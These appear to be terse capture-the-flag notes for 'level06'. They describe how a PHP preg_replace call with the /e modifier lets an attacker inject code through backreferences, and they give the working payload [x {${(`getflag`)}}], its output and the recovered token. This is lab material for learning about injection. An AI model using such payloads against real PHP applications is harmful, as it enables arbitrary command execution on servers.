-There is a php script with preg_replace
-When we userpreg_replace with /e, the replacement string is a PHP expression. So when you use a backreference in the
-eplacement expression, you need to put the backreference inside quotes, or otherwise it would be interpreted as PHP code.
-so we can exploit this
-echo "This is the value of the var named $name: {${$name}}";
-so for getflag => {${`getflag`}}
- change it to [x {${(`getflag`)}}] so the preg_replace with /e works 
-we put it in a file in tmp and give to the binary in the first arg the path to the file we created
-We got => PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
in /home/user/level06/level06.php(4) : regexp code on line 1
-the flag is => wiok45aaoguiboiki2tuin6ub
-https://www.php.net/manual/fr/function.preg-replace.php => /e modifier, name
